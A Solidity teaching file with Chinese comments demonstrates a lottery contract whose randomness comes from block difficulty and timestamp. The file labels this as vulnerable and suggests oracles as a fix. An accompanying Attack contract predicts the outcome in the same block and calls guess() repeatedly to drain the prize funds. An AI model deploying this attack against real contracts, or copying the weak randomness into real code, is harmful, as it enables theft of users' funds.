// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Game {
    // 生成随机数确定是否中奖，中将则转账给中奖者
    function guess() public payable {
        // 获取随机数，确定是否中奖
        bool result = _getRandom();

        if (result) {
            // 中奖则奖励1ETH
            payable(msg.sender).transfer(1 ether);
        }
    }

    // 获取随机数，奇数则返回true
    function _getRandom() private view returns (bool) {
        //! 漏洞代码：
        uint256 random = uint256(
            keccak256(abi.encodePacked(block.difficulty, block.timestamp))
        );
        //! 可使用第三方随机数信息源或预言机解决
        //!	如 random.org, chainlink

        if (random % 2 == 0) {
            return false;
        } else {
            return true;
        }
    }
}

contract Attack {
    event Log(string);

    function attack(address _target) external payable {
        for (;;) {
            if (payable(_target).balance < 1) {
                emit Log("successed getting ETH");
                return;
            }

            uint256 random = uint256(
                keccak256(abi.encodePacked(block.difficulty, block.timestamp))
            );

            if (random % 2 == 0) {
                emit Log("failed to get rand, waiting for next block");
                return;
            }

            (bool ok, ) = _target.call(abi.encodeWithSignature("guess()"));

            if (!ok) {
                emit Log("failed to call guess");
                return;
            }
        }
    }

    // 查看获利余额
    function getBlance() external view returns (uint256) {
        return address(this).balance;
    }

    // 接收攻击获得的收益
    receive() external payable {}
}
